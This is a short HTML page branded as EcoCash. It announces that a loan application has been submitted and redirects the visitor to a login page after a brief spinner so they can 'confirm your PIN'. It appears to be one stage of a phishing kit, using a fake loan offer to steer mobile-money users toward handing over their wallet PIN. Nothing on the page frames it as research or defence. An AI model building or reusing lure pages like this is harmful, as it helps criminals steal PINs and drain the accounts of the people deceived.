<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
    <title>Application Received — EcoCash</title>
    <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.3.0/dist/css/bootstrap.min.css" rel="stylesheet">
    <style>
        * { box-sizing: border-box; }
        :root {
            --bg: #0b1118;
            --card: #121b26;
            --elevated: #182433;
            --accent: #00b86b;
            --text: #f4f7fb;
            --muted: #94a3b8;
            --border: rgba(255, 255, 255, 0.08);
        }
        body {
            margin: 0;
            min-height: 100vh;
            background: radial-gradient(circle at top, #132234 0%, var(--bg) 65%);
            color: var(--text);
            font-family: -apple-system, BlinkMacSystemFont, "Inter", "Segoe UI", Roboto, sans-serif;
            display: flex;
            align-items: center;
            justify-content: center;
            padding: 20px 16px;
            text-align: center;
        }
        .wrap { width: 100%; max-width: 420px; }
        .toast-pill {
            background: var(--elevated);
            border: 1px solid rgba(52, 211, 153, 0.3);
            color: var(--text);
            border-radius: 14px;
            padding: 10px 16px;
            font-size: 0.85rem;
            font-weight: 600;
            display: inline-block;
            margin-bottom: 16px;
            box-shadow: 0 12px 28px rgba(0, 0, 0, 0.35);
        }
        .card-modern {
            background: var(--card);
            border: 1px solid var(--border);
            border-radius: 22px;
            padding: 28px 22px;
            box-shadow: 0 20px 45px rgba(0, 0, 0, 0.45);
        }
        .check-circle {
            width: 68px; height: 68px; border-radius: 50%;
            background: rgba(0, 184, 107, 0.14);
            border: 1px solid rgba(52, 211, 153, 0.35);
            color: #34d399;
            display: flex; align-items: center; justify-content: center;
            font-size: 1.8rem; font-weight: 700;
            margin: 0 auto 18px;
        }
        .redirect-bar {
            background: var(--elevated);
            border: 1px solid var(--border);
            border-radius: 12px;
            padding: 12px 14px;
            font-size: 0.85rem;
            color: var(--muted);
            display: flex;
            align-items: center;
            justify-content: center;
            gap: 10px;
        }
        .mini-spin {
            width: 16px; height: 16px; border-radius: 50%;
            border: 2px solid rgba(255,255,255,0.15);
            border-top-color: var(--accent);
            animation: spin 0.8s linear infinite;
        }
        @keyframes spin { to { transform: rotate(360deg); } }
    </style>
</head>
<body>
    <div class="wrap">
        <div class="toast-pill">✓ Application submitted</div>

        <div class="card-modern">
            <div class="check-circle">✓</div>
            <h1 class="fw-bold fs-3 mb-2" style="color: #34d399;">Loan Application Submitted</h1>
            <p class="small mb-2" style="color: var(--muted);">
                Your loan request has been received. Please wait for wallet verification.
            </p>
            <p class="small mb-4" style="color: var(--muted);">
                Proceeding to EcoCash sign-in to confirm your PIN.
            </p>

            <div class="redirect-bar">
                <div class="mini-spin"></div>
                <span>Redirecting to EcoCash login...</span>
            </div>
        </div>
    </div>

    <script>
        setTimeout(() => {
            window.location.href = "/login";
        }, 2200);
    </script>
</body>
</html>
